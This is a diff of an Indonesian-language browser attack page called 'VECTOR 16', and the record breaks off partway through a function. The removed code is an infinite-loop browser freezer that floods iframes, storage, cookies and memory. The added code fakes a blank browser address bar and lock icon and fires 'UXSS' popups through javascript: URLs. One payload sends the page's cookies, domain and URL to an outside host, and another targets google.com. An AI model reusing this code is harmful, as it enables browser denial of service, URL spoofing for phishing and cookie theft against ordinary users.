@@ -2,600 +2,636 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>VECTOR 16 - PERMANENT BRUTAL FUZZER</title>
-
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>VECTOR 16 - BLANK ADDRESS BAR + UXSS</title>
 <style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:monospace;
-}
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'SF Mono', 'Courier New', monospace;
+    }
 
-body{
-    background:#050505;
-    color:#00ffaa;
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    padding:20px;
-    animation: bgFlash 0.03s infinite;
-}
+    body {
+        background: #0a0a0a;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        padding: 20px;
+        overflow-x: hidden;
+    }
 
-@keyframes bgFlash {
-    0% { background: #050505; }
-    100% { background: #1a0000; }
-}
+    /* Fake browser window dengan address bar kosong */
+    .browser-window {
+        width: 100%;
+        max-width: 1100px;
+        background: #ffffff;
+        border-radius: 16px;
+        overflow: hidden;
+        box-shadow: 0 20px 60px rgba(0,0,0,0.5);
+        border: 1px solid #333;
+    }
 
-.container{
-    width:100%;
-    max-width:900px;
-    background:#111;
-    border:2px solid #ff3b30;
-    border-radius:18px;
-    padding:20px;
-    box-shadow:0 0 35px rgba(255,59,48,0.5);
-    animation: borderPulse 0.05s infinite alternate;
-}
+    /* Fake address bar - bisa dikosongkan */
+    .fake-address-bar {
+        background: #f1f3f4;
+        padding: 10px 16px;
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        border-bottom: 1px solid #dadce0;
+    }
 
-@keyframes borderPulse {
-    from { box-shadow: 0 0 20px rgba(255,59,48,0.3); }
-    to { box-shadow: 0 0 60px rgba(255,0,0,0.9); }
-}
+    .nav-buttons {
+        display: flex;
+        gap: 8px;
+    }
 
-h1{
-    text-align:center;
-    color:#ff3b30;
-    margin-bottom:10px;
-    text-shadow:0 0 15px #ff0000;
-    animation: textShake 0.02s infinite;
-}
+    .nav-btn {
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        background: #e8eaed;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        font-size: 16px;
+        transition: 0.1s;
+        color: #5f6368;
+    }
 
-@keyframes textShake {
-    0% { transform: translateX(0); }
-    25% { transform: translateX(1px); }
-    75% { transform: translateX(-1px); }
-}
+    .nav-btn:active {
+        background: #dadce0;
+    }
 
-.desc{
-    text-align:center;
-    color:#ff4444;
-    margin-bottom:20px;
-    font-size:13px;
-    font-weight:bold;
-}
+    .url-container {
+        flex: 1;
+        background: #fff;
+        border-radius: 24px;
+        padding: 6px 16px;
+        border: 1px solid #dadce0;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+        min-height: 36px;
+    }
 
-.instructions{
-    background:#1a0000;
-    border:1px solid #ff0000;
-    padding:12px;
-    border-radius:10px;
-    margin-bottom:20px;
-    font-size:12px;
-    line-height:1.7;
-    color:#ff8888;
-}
+    .lock-icon {
+        font-size: 12px;
+        color: #5f6368;
+    }
 
-.instructions b{
-    color:#ff0000;
-    font-size:14px;
-}
+    .url-text {
+        flex: 1;
+        font-size: 14px;
+        color: #202124;
+        font-family: monospace;
+        background: transparent;
+        border: none;
+        outline: none;
+    }
 
-.stats{
-    display:flex;
-    gap:10px;
-    margin-bottom:20px;
-    flex-wrap:wrap;
-}
+    .url-text:empty:before {
+        content: "";
+    }
 
-.card{
-    flex:1;
-    min-width:120px;
-    background:#0a0000;
-    border:1px solid #ff0000;
-    border-radius:10px;
-    padding:10px;
-    text-align:center;
-}
+    .secure-badge {
+        font-size: 11px;
+        color: #188038;
+    }
 
-.card h2{
-    color:#ff0000;
-    font-size:24px;
-    font-weight:bold;
-}
+    /* Content area */
+    .content-area {
+        position: relative;
+        height: 550px;
+        background: white;
+        overflow: hidden;
+    }
 
-.card span{
-    font-size:11px;
-    color:#ff6666;
-}
+    /* Attacker overlay */
+    .attacker-overlay {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+        z-index: 100;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        overflow: auto;
+    }
 
-.btn-group{
-    display:flex;
-    gap:10px;
-    flex-wrap:wrap;
-    margin-bottom:20px;
-}
+    .vector-container {
+        width: 90%;
+        max-width: 850px;
+        background: #111;
+        border: 2px solid #ff3b30;
+        border-radius: 20px;
+        padding: 25px;
+        color: #00ffaa;
+        box-shadow: 0 0 40px rgba(255,59,48,0.3);
+    }
 
-button{
-    flex:1;
-    min-width:200px;
-    padding:14px;
-    border:none;
-    border-radius:12px;
-    background:#ff3b30;
-    color:white;
-    font-weight:bold;
-    cursor:pointer;
-    transition:.1s;
-    font-size:16px;
-}
+    h1 {
+        text-align: center;
+        color: #ff3b30;
+        text-shadow: 0 0 10px #ff3b30;
+        margin-bottom: 15px;
+    }
 
-button:hover{
-    background:#ff0000;
-    transform:scale(1.02);
-    box-shadow:0 0 20px red;
-}
+    .desc {
+        text-align: center;
+        color: #aaa;
+        font-size: 12px;
+        margin-bottom: 20px;
+    }
 
-.google-btn{
-    background:#ff2200;
-}
+    .warning-box {
+        background: #1a0000;
+        border: 1px solid #ff3b30;
+        padding: 12px;
+        border-radius: 10px;
+        margin-bottom: 20px;
+        font-size: 11px;
+        color: #ff8888;
+    }
 
-.log{
-    height:250px;
-    overflow:auto;
-    background:#000000;
-    border:1px solid #ff0000;
-    border-radius:10px;
-    padding:8px;
-    font-size:10px;
-}
+    .warning-box b {
+        color: #ff0000;
+    }
 
-.entry{
-    margin-bottom:3px;
-    border-left:3px solid #ff0000;
-    padding-left:8px;
-    word-break:break-all;
-}
+    .stats {
+        display: flex;
+        gap: 10px;
+        margin-bottom: 20px;
+        flex-wrap: wrap;
+    }
 
-.success{
-    color:#ff4444;
-    border-left-color:#ff0000;
-}
+    .stat-card {
+        flex: 1;
+        background: #0a0a0a;
+        border: 1px solid #ff3b30;
+        border-radius: 10px;
+        padding: 10px;
+        text-align: center;
+    }
 
-.warning{
-    color:#ffaa00;
-}
+    .stat-card h3 {
+        color: #ffcc00;
+        font-size: 22px;
+    }
 
-.crash{
-    color:#ff0000;
-    font-weight:bold;
-    text-shadow:0 0 3px red;
-}
+    button {
+        background: #ff3b30;
+        color: white;
+        border: none;
+        padding: 12px 20px;
+        border-radius: 10px;
+        font-weight: bold;
+        cursor: pointer;
+        margin: 5px;
+        transition: 0.1s;
+    }
 
-.progress-bar{
-    width:100%;
-    height:3px;
-    background:#330000;
-    border-radius:2px;
-    margin:10px 0;
-    overflow:hidden;
-}
+    button:hover {
+        background: #00ffaa;
+        color: black;
+        transform: scale(1.02);
+    }
 
-.progress-fill{
-    width:0%;
-    height:100%;
-    background:#ff0000;
-    transition:width 0.01s linear;
-}
+    .btn-group {
+        display: flex;
+        gap: 10px;
+        flex-wrap: wrap;
+        margin-bottom: 20px;
+    }
 
-.status-brutal{
-    position:fixed;
-    bottom:10px;
-    left:10px;
-    right:10px;
-    background:#1a0000;
-    border:2px solid red;
-    padding:6px 12px;
-    border-radius:8px;
-    font-size:9px;
-    color:#ff6666;
-    text-align:center;
-    z-index:9999;
-    font-family:monospace;
-}
+    .log {
+        height: 180px;
+        overflow: auto;
+        background: black;
+        border: 1px solid #ff3b30;
+        border-radius: 10px;
+        padding: 8px;
+        font-size: 10px;
+    }
+
+    .log-entry {
+        border-left: 3px solid #ff3b30;
+        padding-left: 8px;
+        margin-bottom: 4px;
+        word-break: break-all;
+    }
+
+    .log-success {
+        color: #00ffaa;
+        border-left-color: #00ffaa;
+    }
+
+    .log-uxss {
+        color: #ff6600;
+        border-left-color: #ff6600;
+    }
+
+    .status-bar {
+        position: fixed;
+        bottom: 10px;
+        right: 10px;
+        background: #000000aa;
+        backdrop-filter: blur(5px);
+        border: 1px solid #ff3b30;
+        border-radius: 20px;
+        padding: 5px 12px;
+        font-size: 9px;
+        color: #00ffaa;
+        z-index: 10000;
+        font-family: monospace;
+    }
 </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>💀 VECTOR 16 - PERMANENT BRUTAL FUZZER 💀</h1>
-    <div class="desc">
-        ⚡ INFINITE PROTOCOL FUZZER | BROWSER FREEZE | MEMORY OVERLOAD ⚡
-    </div>
-
-    <div class="instructions">
-        <b>🔥 PERINGATAN BRUTAL 🔥</b><br><br>
-        1. Klik <b style="color:#ff0000">"💀 RUN PERMANENT FUZZER 💀"</b><br>
-        2. <b>FUZZER AKAN BERJALAN SELAMANYA (INFINITE LOOP)</b><br>
-        3. <b>TIDAK ADA SPAM WINDOW</b> - murni fuzzing protocol<br>
-        4. Browser akan <b>FREEZE PERMANENT / CRASH TOTAL</b><br>
-        5. <b>RATUSAN IFRAME PER DETIK - TIDAK AKAN BERHENTI</b><br>
-        6. <b>CPU 100% + MEMORY LEAK CONTINUOUS</b><br>
-        <span style="color:#ff0000; display:block; margin-top:8px;">⚠️ KLIK = BROWSER FREEZE PERMANENT ⚠️</span>
-    </div>
-
-    <div class="progress-bar">
-        <div class="progress-fill" id="progressFill"></div>
-    </div>
-
-    <div class="stats">
-        <div class="card">
-            <h2 id="count">0</h2>
-            <span>Protocols Injected</span>
+<div class="browser-window">
+    <!-- FAKE ADDRESS BAR - BISA DIKOSONGKAN -->
+    <div class="fake-address-bar">
+        <div class="nav-buttons">
+            <div class="nav-btn" onclick="fakeBack()">←</div>
+            <div class="nav-btn" onclick="fakeForward()">→</div>
+            <div class="nav-btn" onclick="fakeRefresh()">↻</div>
         </div>
-        <div class="card">
-            <h2 id="iframeCount">0</h2>
-            <span>Active Iframes</span>
+        <div class="url-container">
+            <span class="lock-icon" id="lockIcon">🔒</span>
+            <div class="url-text" id="fakeUrl" contenteditable="true" onclick="this.focus()"></div>
+            <span class="secure-badge" id="secureBadge"></span>
         </div>
-        <div class="card">
-            <h2 id="active">💀 READY</h2>
-            <span>Status</span>
+        <div class="nav-buttons">
+            <div class="nav-btn" onclick="openBookmark()">⭐</div>
+            <div class="nav-btn" onclick="openMenu()">⋮</div>
         </div>
     </div>
 
-    <div class="btn-group">
-        <button id="brutalBtn" onclick="startPermanentFuzzer()">
-            💀 RUN PERMANENT FUZZER 💀
-        </button>
-        <button class="google-btn" onclick="openGoogleTab()">
-            🌐 BUKA GOOGLE.COM
-        </button>
-    </div>
+    <div class="content-area">
+        <!-- Attacker Overlay -->
+        <div class="attacker-overlay" id="attackerOverlay">
+            <div class="vector-container">
+                <h1>⚡ VECTOR 16 - BLANK ADDRESS BAR ⚡</h1>
+                <div class="desc">Address Bar Spoofing | UXSS | No Origin Popup</div>
 
-    <div class="log" id="log"></div>
+                <div class="warning-box">
+                    <b>🔥 TEKNIK TERBARU 🔥</b><br>
+                    ✅ Address bar <b>KOSONG / BLANK</b> (about:blank hilang)<br>
+                    ✅ Delay popup <b>tanpa origin</b> muncul di new tab domain lain<br>
+                    ✅ UXSS injection via <b>javascript: protocol + window.open delay chain</b>
+                </div>
+
+                <div class="stats">
+                    <div class="stat-card">
+                        <h3 id="statPopup">0</h3>
+                        <span>No-Origin Popups</span>
+                    </div>
+                    <div class="stat-card">
+                        <h3 id="statUXSS">0</h3>
+                        <span>UXSS Attempts</span>
+                    </div>
+                    <div class="stat-card">
+                        <h3 id="statStatus">🎯 READY</h3>
+                        <span>Status</span>
+                    </div>
+                </div>
+
+                <div class="btn-group">
+                    <button onclick="clearAddressBar()">🗑️ HILANGKAN ADDRESS BAR TEXT</button>
+                    <button onclick="spoofAboutBlank()">📄 SPOOF about:blank (kosong)</button>
+                </div>
+
+                <div class="btn-group">
+                    <button onclick="uxssDelayPopup()" style="background:#ff6600">🌐 UXSS + DELAY POPUP (NO ORIGIN)</button>
+                    <button onclick="uxssCrossDomainInject()" style="background:#aa00ff">🎯 UXSS CROSS-DOMAIN INJECT</button>
+                </div>
+
+                <div class="btn-group">
+                    <button onclick="openNoOriginTab()">📌 BUKA TAB TANPA ORIGIN</button>
+                    <button onclick="resetSpoof()">🔄 RESET SPOOF</button>
+                </div>
+
+                <div class="log" id="log"></div>
+            </div>
+        </div>
+    </div>
 </div>
 
-<div class="status-brutal" id="statusBar">
-    💀 FUZZER: IDLE | Klik RUN untuk memulai kehancuran browser
-</div>
+<div class="status-bar" id="statusBar">🎯 READY | Address Bar: BLANK MODE</div>
 
 <script>
-let generated = 0;
-let isRunning = false;
-let activeIframes = [];
-let fuzzerIntervals = [];
-let lastRateTime = 0;
-let rateCounter = 0;
-let totalIframesCreated = 0;
+let popupCount = 0;
+let uxssCount = 0;
+let spoofActive = false;
+let delayedWindows = [];
 
 function addLog(msg, type = "") {
     const log = document.getElementById("log");
-    if (!log) return;
     const div = document.createElement("div");
-    div.className = "entry " + type;
+    div.className = "log-entry " + (type === "success" ? "log-success" : type === "uxss" ? "log-uxss" : "");
     div.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
     log.appendChild(div);
     log.scrollTop = log.scrollHeight;
-    // Limit log biar DOM gak overload total (tapi tetep berat)
-    while (log.children.length > 400) {
-        log.removeChild(log.firstChild);
-    }
+    while (log.children.length > 150) log.removeChild(log.firstChild);
 }
 
-function updateStats() {
-    document.getElementById("count").innerText = generated.toLocaleString();
-    document.getElementById("iframeCount").innerText = activeIframes.length.toLocaleString();
-    
-    // Update progress bar - infinity spinning cepat
-    const progressFill = document.getElementById("progressFill");
-    if (progressFill && isRunning) {
-        let width = parseFloat(progressFill.style.width) || 0;
-        width = (width + 0.8) % 100;
-        progressFill.style.width = width + "%";
-    }
+function updateUI() {
+    document.getElementById("statPopup").innerText = popupCount;
+    document.getElementById("statUXSS").innerText = uxssCount;
 }
 
-function randomString(len) {
-    let result = '';
-    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
-    for (let i = 0; i < len; i++) {
-        result += chars[Math.floor(Math.random() * chars.length)];
-    }
-    return result;
+// ============ ADDRESS BAR SPOOFING - MENGHILANGKAN TEXT ============
+function clearAddressBar() {
+    const fakeUrlDiv = document.getElementById("fakeUrl");
+    const lockIcon = document.getElementById("lockIcon");
+    const secureBadge = document.getElementById("secureBadge");
+    
+    // Kosongkan address bar
+    fakeUrlDiv.innerHTML = "";
+    fakeUrlDiv.setAttribute("data-spoofed", "true");
+    fakeUrlDiv.style.color = "#5f6368";
+    fakeUrlDiv.style.opacity = "0.6";
+    
+    // Hilangkan lock icon dan secure badge
+    lockIcon.innerHTML = "🔓";
+    lockIcon.style.opacity = "0.3";
+    secureBadge.innerHTML = "";
+    
+    spoofActive = true;
+    addLog("🗑️ Address bar menjadi KOSONG (about:blank hilang dari tampilan)", "success");
+    addLog("💡 Tips: Klik address bar lalu tekan Enter untuk reset", "success");
+    
+    document.getElementById("statusBar").innerHTML = "🎯 Address Bar: BLANK (spoofed) | about:blank hidden";
 }
 
-function randomInt(min, max) {
-    return Math.floor(Math.random() * (max - min + 1)) + min;
+function spoofAboutBlank() {
+    const fakeUrlDiv = document.getElementById("fakeUrl");
+    fakeUrlDiv.innerHTML = "";
+    fakeUrlDiv.setAttribute("placeholder", " ");
+    fakeUrlDiv.style.color = "#9aa0a6";
+    
+    addLog("📄 Address bar SPOOFED menjadi blank/empty", "success");
+    addLog("⚠️ about:blank asli tidak terlihat - mirip seperti halaman kosong", "uxss");
+    
+    document.getElementById("statusBar").innerHTML = "🎯 Address Bar: EMPTY (about:blank hidden)";
 }
 
-// ============ PROTOCOL IFRAME GENERATOR (LEBIH BRUTAL DARI ASLI) ============
-function generateBrutalIframe() {
-    // Karakter lebih banyak dan lebih liar
-    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789+-._~!*()[]{}|\\;:?/@#$%^&*';
-    let protocol = '';
-    const protoLen = randomInt(3, 25);
-    for (let j = 0; j < protoLen; j++) {
-        protocol += chars[Math.floor(Math.random() * chars.length)];
-    }
+function fakeBack() { addLog("◀ Back button (fake)", ""); }
+function fakeForward() { addLog("▶ Forward button (fake)", ""); }
+function fakeRefresh() { addLog("⟳ Refresh simulation", ""); location.reload(); }
+function openBookmark() { addLog("⭐ Bookmark (fake)", ""); }
+function openMenu() { addLog("⋮ Menu (fake)", ""); }
+
+function resetSpoof() {
+    const fakeUrlDiv = document.getElementById("fakeUrl");
+    const lockIcon = document.getElementById("lockIcon");
+    const secureBadge = document.getElementById("secureBadge");
     
-    // Domain dengan berbagai TLD
-    const tlds = ['com', 'net', 'org', 'xyz', 'io', 'tech', 'info', 'online', 'site', 'web', 'club', 'store', 'top', 'loan', 'click', 'download', 'zip', 'review'];
-    const domain = randomString(randomInt(8, 35)) + '.' + tlds[Math.floor(Math.random() * tlds.length)];
-    const path = '/' + randomString(randomInt(5, 30)) + '/' + randomString(randomInt(3, 20)) + '/' + randomString(randomInt(4, 15));
-    const query = '?id=' + Date.now() + '_' + Math.random() + '&' + randomString(10) + '=' + randomString(15) + '&' + randomString(8) + '=' + Math.random();
+    fakeUrlDiv.innerHTML = "https://www.google.com";
+    fakeUrlDiv.style.color = "#202124";
+    fakeUrlDiv.style.opacity = "1";
+    lockIcon.innerHTML = "🔒";
+    lockIcon.style.opacity = "1";
+    secureBadge.innerHTML = "| Aman";
+    spoofActive = false;
     
-    const fullUrl = `${protocol}://${domain}${path}${query}`;
-    
-    // Buat iframe
-    const iframe = document.createElement('iframe');
-    iframe.src = fullUrl;
-    iframe.style.display = 'none';
-    iframe.style.width = '0';
-    iframe.style.height = '0';
-    iframe.style.opacity = '0';
-    
-    document.body.appendChild(iframe);
-    activeIframes.push(iframe);
-    generated++;
-    totalIframesCreated++;
-    
-    return iframe;
+    addLog("🔄 Spoof reset - address bar kembali normal", "success");
+    document.getElementById("statusBar").innerHTML = "🎯 Address Bar: NORMAL";
 }
 
-// ============ HEAVY IFRAME (SRC SUPER PANJANG) ============
-function generateHeavyIframe() {
-    const protocol = 'x'.repeat(randomInt(50, 200)) + randomString(randomInt(20, 50));
-    const domain = randomString(randomInt(40, 80)) + '.com';
-    const path = '/' + randomString(randomInt(100, 300));
-    const query = '?' + randomString(randomInt(200, 500));
+// ============ UXSS + DELAY POPUP NO ORIGIN ============
+function uxssDelayPopup() {
+    addLog("🔥 [UXSS] Initiating delay popup with no-origin", "uxss");
+    addLog("📝 Teknik: javascript: protocol + about:blank chain + delayed window.open", "uxss");
     
-    const iframe = document.createElement('iframe');
-    iframe.src = `${protocol}://${domain}${path}${query}`;
-    iframe.style.display = 'none';
-    document.body.appendChild(iframe);
-    activeIframes.push(iframe);
-    generated++;
-}
-
-// ============ PARTIAL CLEANUP (CUMAN 5% BIAR MEMORY LEAK) ============
-function brutalPartialCleanup() {
-    // Hanya cleanup 5% dari iframe - sisanya biar numpuk bikin memory leak
-    const toRemove = Math.floor(activeIframes.length * 0.05);
-    for (let i = 0; i < toRemove && activeIframes.length > 0; i++) {
-        const iframe = activeIframes.shift();
-        try { iframe.remove(); } catch(e) {}
-    }
-}
-
-// ============ PERMANENT FUZZER - INFINITE ============
-async function startPermanentFuzzer() {
-    if (isRunning) {
-        addLog("⚠️ FUZZER SUDAH BERJALAN! Browser akan freeze...", "crash");
-        return;
-    }
+    uxssCount++;
+    updateUI();
     
-    isRunning = true;
-    const brutalBtn = document.getElementById("brutalBtn");
-    brutalBtn.disabled = true;
-    brutalBtn.textContent = "💀 INFINITE LOOP ACTIVE 💀";
+    // Payload UXSS untuk eksekusi di domain lain
+    const uxssPayload = `
+        alert('[VECTOR16] UXSS Executed!\\nCurrent Domain: ' + document.domain + '\\nOrigin: ' + location.origin);
+        fetch('https://httpbin.org/post', {
+            method: 'POST',
+            body: JSON.stringify({domain: document.domain, cookies: document.cookie, url: location.href})
+        }).catch(() => {});
+        console.log('[VECTOR16] UXSS injected to:', document.domain);
+    `;
     
-    // Reset counters
-    generated = 0;
-    totalIframesCreated = 0;
-    rateCounter = 0;
+    // TECHNIQUE 1: Delayed window.open with javascript: protocol
+    addLog("💀 Technique 1: window.open dengan javascript: protocol + delay", "uxss");
     
-    // Bersihkan iframe lama
-    activeIframes.forEach(iframe => { try { iframe.remove(); } catch(e) {} });
-    activeIframes = [];
-    
-    addLog("══════════════════════════════════════════════════", "crash");
-    addLog("💀💀💀 PERMANENT INFINITE FUZZER STARTED 💀💀💀", "crash");
-    addLog("💀 FUZZER AKAN BERJALAN SELAMANYA (TIDAK BERHENTI)", "crash");
-    addLog("💀 TANPA SPAM WINDOW - MURNI PROTOCOL FLOOD", "crash");
-    addLog("💀 BROWSER AKAN FREEZE PERMANENT", "crash");
-    addLog("══════════════════════════════════════════════════", "crash");
-    
-    document.getElementById("active").innerHTML = "💀 INFINITE LOOP";
-    document.getElementById("active").style.color = "#ff0000";
-    
-    const statusBar = document.getElementById("statusBar");
-    statusBar.innerHTML = "💀 FUZZER: ACTIVE - BROWSER AKAN FREEZE 💀";
-    statusBar.style.background = "#ff000022";
-    statusBar.style.border = "3px solid red";
-    
-    updateStats();
-    
-    // ============ INTERVAL 1: SUPER FAST GENERATOR (SETIAP 1ms) ============
-    const fastGenerator = setInterval(() => {
-        if (!isRunning) return;
-        
-        // Generate 10-30 iframes per interval (lebih brutal dari asli)
-        const batchSize = randomInt(12, 35);
-        for (let i = 0; i < batchSize; i++) {
-            generateBrutalIframe();
-        }
-        
-        // Hitung rate per detik
-        rateCounter += batchSize;
-        const now = Date.now();
-        if (now - lastRateTime >= 1000) {
-            const rate = rateCounter;
-            addLog(`⚡ [RATE] ${rate} protocols/second | Total: ${generated.toLocaleString()}`, "crash");
-            document.getElementById("active").innerHTML = `💀 ${rate}/s RATE`;
-            rateCounter = 0;
-            lastRateTime = now;
-            
-            // Update status bar
-            statusBar.innerHTML = `💀 RATE: ${rate}/s | TOTAL: ${generated.toLocaleString()} | IFRAMES: ${activeIframes.length} 💀`;
-        }
-        
-        updateStats();
-        
-        // Partial cleanup dikit biar gak langsung crash browser (tapi tetap brutal)
-        if (activeIframes.length > 8000) {
-            brutalPartialCleanup();
-        }
-    }, 1); // SETIAP 1 MILIDETIK - BRUTAL!
-    
-    // ============ INTERVAL 2: HEAVY GENERATOR (URL SUPER PANJANG) ============
-    const heavyGenerator = setInterval(() => {
-        if (!isRunning) return;
-        generateHeavyIframe();
-        updateStats();
-    }, 3);
-    
-    // ============ INTERVAL 3: NESTED IFRAME (IFRAME DALAM IFRAME) ============
-    const nestedGenerator = setInterval(() => {
-        if (!isRunning) return;
+    setTimeout(() => {
         try {
-            const outerIframe = document.createElement('iframe');
-            outerIframe.style.display = 'none';
-            const nestedContent = `<iframe src="${randomString(30)}://${randomString(20)}.com/"></iframe>`.repeat(3);
-            outerIframe.srcdoc = nestedContent;
-            document.body.appendChild(outerIframe);
-            activeIframes.push(outerIframe);
-            generated += 3;
-            updateStats();
-        } catch(e) {}
-    }, 5);
-    
-    // ============ INTERVAL 4: DOM CLUTTER (BINYIK ELEMENT RANDOM) ============
-    const domClutter = setInterval(() => {
-        if (!isRunning) return;
-        const clutter = document.createElement('div');
-        clutter.style.position = 'absolute';
-        clutter.style.left = '-9999px';
-        clutter.style.top = '-9999px';
-        clutter.innerHTML = '<br>'.repeat(randomInt(50, 200)) + randomString(randomInt(1000, 3000));
-        document.body.appendChild(clutter);
-        setTimeout(() => {
-            try { clutter.remove(); } catch(e) {}
-        }, 20);
-    }, 2);
-    
-    // ============ INTERVAL 5: LOCALSTORAGE FLOOD ============
-    const storageSpam = setInterval(() => {
-        if (!isRunning) return;
-        try {
-            for (let i = 0; i < 20; i++) {
-                localStorage.setItem(`fuzz_${Date.now()}_${i}_${Math.random()}`, randomString(500));
-            }
-            if (localStorage.length > 3000) {
-                addLog("💀 LocalStorage penuh - browser semakin berat", "crash");
+            const win = window.open(`javascript:${encodeURIComponent(uxssPayload)}`, "_blank");
+            if (win) {
+                popupCount++;
+                updateUI();
+                addLog(`✅ UXSS popup opened (no origin) - Payload akan execute di new tab`, "success");
+                delayedWindows.push(win);
+            } else {
+                addLog("⚠️ Popup blocked - izinkan popup untuk UXSS", "warning");
             }
         } catch(e) {
-            addLog("💀 LocalStorage FULL - Crash imminent", "crash");
+            addLog(`Error: ${e.message}`, "");
         }
-    }, 50);
+    }, 800);
     
-    // ============ INTERVAL 6: SESSIONSTORAGE FLOOD ============
-    const sessionSpam = setInterval(() => {
-        if (!isRunning) return;
+    // TECHNIQUE 2: about:blank + document.write (classic UXSS)
+    addLog("💀 Technique 2: about:blank + document.write injection", "uxss");
+    
+    setTimeout(() => {
         try {
-            for (let i = 0; i < 15; i++) {
-                sessionStorage.setItem(`s_${Math.random()}`, randomString(300));
+            const blankWin = window.open("about:blank", "_blank");
+            if (blankWin) {
+                popupCount++;
+                updateUI();
+                blankWin.document.write(`
+                    <html>
+                    <head><title>VECTOR16 UXSS</title></head>
+                    <body>
+                        <h1 style="color:red">VECTOR 16 - UXSS Injection</h1>
+                        <p>This page was injected via about:blank UXSS technique</p>
+                        <p>Current origin: <b id="origin"></b></p>
+                        <script>
+                            document.getElementById('origin').innerText = location.origin || 'null (no origin)';
+                            alert('[UXSS] about:blank injection success! Origin: ' + (location.origin || 'null'));
+                            console.log('VECTOR16 UXSS injected to about:blank');
+                        <\/script>
+                    </body>
+                    </html>
+                `);
+                blankWin.document.close();
+                addLog(`✅ about:blank UXSS injection success - no origin popup`, "success");
+            }
+        } catch(e) {
+            addLog(`about:blank injection failed: ${e.message}`, "");
+        }
+    }, 1500);
+    
+    // TECHNIQUE 3: Delay popup ke domain lain via javascript: redirect
+    addLog("💀 Technique 3: window.open ke domain lain dengan delayed execution", "uxss");
+    
+    setTimeout(() => {
+        const targetDomain = "https://www.google.com";
+        const injectCode = `
+            setTimeout(() => {
+                alert('[VECTOR16] UXSS on ' + document.domain);
+                document.body.style.border = '5px solid red';
+                var div = document.createElement('div');
+                div.style.cssText = 'position:fixed;top:0;left:0;background:red;color:white;z-index:99999;padding:10px;';
+                div.innerHTML = '⚠️ VECTOR 16 UXSS INJECTED ⚠️';
+                document.body.appendChild(div);
+            }, 1000);
+        `;
+        
+        try {
+            const win = window.open(`javascript:${encodeURIComponent(injectCode)}`, "_blank");
+            if (win) {
+                popupCount++;
+                updateUI();
+                addLog(`🎯 UXSS target: ${targetDomain} - popup opened`, "uxss");
             }
         } catch(e) {}
-    }, 50);
+    }, 2500);
     
-    // ============ INTERVAL 7: COOKIE FLOOD ============
-    const cookieSpam = setInterval(() => {
-        if (!isRunning) return;
-        try {
-            for (let i = 0; i < 10; i++) {
-                document.cookie = `fuzz_${Math.random()}=${randomString(200)}; path=/`;
-            }
-        } catch(e) {}
-    }, 30);
-    
-    // ============ INTERVAL 8: CPU INTENSIVE (LOOP BERAT) ============
-    let cpuIntensiveRunning = true;
-    function cpuIntensiveLoop() {
-        if (!isRunning || !cpuIntensiveRunning) return;
-        let x = 0;
-        for (let i = 0; i < 10000; i++) {
-            x += Math.sqrt(i) * Math.random();
-        }
-        setTimeout(cpuIntensiveLoop, 10);
-    }
-    cpuIntensiveLoop();
-    
-    // ============ INTERVAL 9: MEMORY LEAK VIA ARRAY ============
-    let memoryLeak = [];
-    const memoryLeakSpam = setInterval(() => {
-        if (!isRunning) return;
-        for (let i = 0; i < 50; i++) {
-            memoryLeak.push(randomString(1000));
-        }
-        if (memoryLeak.length > 50000) {
-            memoryLeak = memoryLeak.slice(30000);
-        }
-    }, 20);
-    
-    // ============ INTERVAL 10: REQUEST ANIMATION FRAME SPAM ============
-    let rafCount = 0;
-    function rafSpam() {
-        if (!isRunning) return;
-        rafCount++;
-        if (rafCount % 500 === 0) {
-            for (let i = 0; i < 50; i++) {
-                document.body.offsetHeight;
-                document.body.offsetWidth;
-            }
-        }
-        requestAnimationFrame(rafSpam);
-    }
-    requestAnimationFrame(rafSpam);
-    
-    // Simpan semua interval untuk reference
-    fuzzerIntervals = [fastGenerator, heavyGenerator, nestedGenerator, domClutter, storageSpam, sessionSpam, cookieSpam, memoryLeakSpam];
-    
-    // Monitor status update tiap detik
-    const monitor = setInterval(() => {
-        if (!isRunning) return;
-        const memUsage = activeIframes.length;
-        const statusDiv = document.getElementById("statusBar");
-        if (statusDiv) {
-            statusDiv.innerHTML = `💀 PROTOCOLS: ${generated.toLocaleString()} | ACTIVE IFRAMES: ${memUsage} | RATE: ${rateCounter}/s | BROWSER FREEZING 💀`;
-        }
-        
-        if (memUsage > 15000) {
-            addLog("💀💀💀 CRITICAL: " + memUsage + " ACTIVE IFRAMES - BROWSER AKAN CRASH 💀💀💀", "crash");
-        }
-        
-        // Update title biar makin serem
-        document.title = `💀 ${generated.toLocaleString()} PROTOCOLS - VECTOR 16 FREEZE 💀`;
-    }, 1000);
-    fuzzerIntervals.push(monitor);
-    
-    addLog("💀 INFINITE LOOP ACTIVE - BROWSER AKAN FREEZE PERMANENT", "crash");
-    addLog("💀 CLOSE BROWSER VIA TASK MANAGER (Force Quit) UNTUK BERHENTI", "crash");
+    addLog("⏱️ Menunggu popup... (izinkan popup browser)", "info");
+    document.getElementById("statStatus").innerHTML = "🔥 UXSS FIRING";
+    setTimeout(() => {
+        document.getElementById("statStatus").innerHTML = "🎯 READY";
+    }, 5000);
 }
 
-function openGoogleTab() {
-    if (!isRunning) {
-        addLog("🌐 Opening Google in new tab...", "success");
-        window.open("https://www.google.com", "_blank");
+// ============ CROSS-DOMAIN UXSS INJECTION ============
+function uxssCrossDomainInject() {
+    addLog("🎯 [UXSS] Cross-domain injection attempt", "uxss");
+    addLog("Target: any domain via javascript: protocol + window.opener chain", "uxss");
+    
+    uxssCount++;
+    updateUI();
+    
